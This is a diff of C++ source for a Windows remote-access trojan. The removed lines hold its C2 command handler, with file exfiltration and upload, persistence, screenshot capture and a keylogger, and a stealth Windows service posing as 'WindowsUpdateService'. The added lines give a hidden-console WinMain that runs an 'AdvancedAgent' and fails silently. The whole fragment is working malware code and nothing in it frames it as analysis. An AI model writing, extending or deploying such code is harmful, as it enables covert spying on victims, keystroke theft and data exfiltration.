-                        std::string response = "FILE|" + filename + "|" + b64_content;
-                        send(c2_socket, response.c_str(), response.length(), 0);
-                    } else {
-                        send(c2_socket, "ERROR|File not found", 20, 0);
-                    }
-                }
-                else if (command.find("UPLOAD|") == 0) {
-                    size_t sep1 = command.find("|", 7);
-                    size_t sep2 = command.find("|", sep1 + 1);
-                    std::string filename = command.substr(7, sep1 - 7);
-                    std::string b64_content = command.substr(sep1 + 1, sep2 - sep1 - 1);
-                    
-                    // Decode base64 (simplified - need proper base64 decode)
-                    std::string content = b64_content; // Should decode
-                    
-                    if (write_file(filename, content)) {
-                        send(c2_socket, "UPLOAD_SUCCESS", 14, 0);
-                    } else {
-                        send(c2_socket, "UPLOAD_FAILED", 13, 0);
-                    }
-                }
-                else if (command == "PERSIST") {
-                    establish_persistence();
-                    send(c2_socket, "PERSISTENCE_ESTABLISHED", 23, 0);
-                }
-                else if (command == "SCREENSHOT") {
-                    std::string screenshot = take_screenshot();
-                    send(c2_socket, screenshot.c_str(), screenshot.length(), 0);
-                }
-                else if (command == "KEYLOGGER_START") {
-                    start_keylogger();
-                    send(c2_socket, "KEYLOGGER_STARTED", 17, 0);
-                }
-                else if (command == "KEYLOGGER_STOP") {
-                    stop_keylogger();
-                    send(c2_socket, "KEYLOGGER_STOPPED", 17, 0);
-                }
-                else if (command == "EXIT") {
-                    running = false;
-                    send(c2_socket, "AGENT_EXITING", 13, 0);
-                }
-            } else if (bytes_received == 0) {
-                // Connection closed
-                closesocket(c2_socket);
-                c2_socket = INVALID_SOCKET;
-            }
-            
-            Sleep(5000); // Wait 5 seconds between checks
+            Sleep(10000); // Check every 10 seconds
         }
     }
 };
 
-// Windows Service functionality (for stealth)
-#ifdef _WIN32
-SERVICE_STATUS g_ServiceStatus = {0};
-SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
-HANDLE g_ServiceStopEvent = INVALID_HANDLE_VALUE;
-
-VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv);
-VOID WINAPI ServiceCtrlHandler(DWORD);
-DWORD WINAPI ServiceWorkerThread(LPVOID lpParam);
-
-#define SERVICE_NAME "WindowsUpdateService"
-
-int RunAsService() {
-    SERVICE_TABLE_ENTRY ServiceTable[] = {
-        { (LPSTR)SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain },
-        { NULL, NULL }
-    };
-    
-    if (StartServiceCtrlDispatcher(ServiceTable) == FALSE) {
-        return GetLastError();
-    }
-    
-    return 0;
-}
-
-VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv) {
-    g_StatusHandle = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceCtrlHandler);
-    
-    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
-    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
-    g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
-    g_ServiceStatus.dwWin32ExitCode = 0;
-    g_ServiceStatus.dwServiceSpecificExitCode = 0;
-    g_ServiceStatus.dwCheckPoint = 0;
-    
-    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
-    
-    g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
-    
-    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
-    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
-    
-    HANDLE hThread = CreateThread(NULL, 0, ServiceWorkerThread, NULL, 0, NULL);
-    
-    WaitForSingleObject(hThread, INFINITE);
-    
-    CloseHandle(g_ServiceStopEvent);
-    
-    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
-    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
-}
-
-VOID WINAPI ServiceCtrlHandler(DWORD CtrlCode) {
-    switch (CtrlCode) {
-        case SERVICE_CONTROL_STOP:
-            if (g_ServiceStatus.dwCurrentState != SERVICE_RUNNING)
-                break;
-            
-            g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
-            SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
-            
-            SetEvent(g_ServiceStopEvent);
-            break;
-        default:
-            break;
-    }
-}
-
-DWORD WINAPI ServiceWorkerThread(LPVOID lpParam) {
-    AgentCore agent;
-    agent.run();
-    return ERROR_SUCCESS;
-}
-#endif
-
-// Main entry point
-int main(int argc, char* argv[]) {
-    // Check if running as service
-    #ifdef _WIN32
-    if (argc > 1 && strcmp(argv[1], "--service") == 0) {
-        return RunAsService();
-    }
-    #endif
-    
-    // Hide console window if not debugging
-    #ifdef _WIN32
+// ==================== ENTRY POINT ====================
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
+                   LPSTR lpCmdLine, int nCmdShow) {
+    // Hide console if compiled as GUI app
+    #ifndef _DEBUG
     HWND hwnd = GetConsoleWindow();
-    if (!(argc > 1 && strcmp(argv[1], "--debug") == 0)) {
-        ShowWindow(hwnd, SW_HIDE);
-    }
+    if (hwnd) ShowWindow(hwnd, SW_HIDE);
     #endif
     
-    // Check if already running
-    HANDLE hMutex = CreateMutexA(NULL, TRUE, "Global\\WindowsUpdateAgent");
-    if (GetLastError() == ERROR_ALREADY_EXISTS) {
-        CloseHandle(hMutex);
-        return 0; // Already running
+    // Check command line arguments
+    bool debug_mode = false;
+    if (__argc > 1) {
+        std::string arg = __argv[1];
+        if (arg == "--debug") {
+            debug_mode = true;
+            AllocConsole();
+            freopen("CONOUT$", "w", stdout);
+        }
     }
     
-    // Start agent
-    AgentCore agent;
-    
-    // Establish persistence on first run
-    static bool first_run = true;
-    if (first_run) {
-        agent.run(); // This will call establish_persistence() when PERSIST command received
-        first_run = false;
+    try {
+        AdvancedAgent agent;
+        agent.run();
+    } catch (...) {
+        // Silent fail
+        return 1;
     }
-    
-    agent.run();
-    
-    ReleaseMutex(hMutex);
-    CloseHandle(hMutex);
     
     return 0;
 }
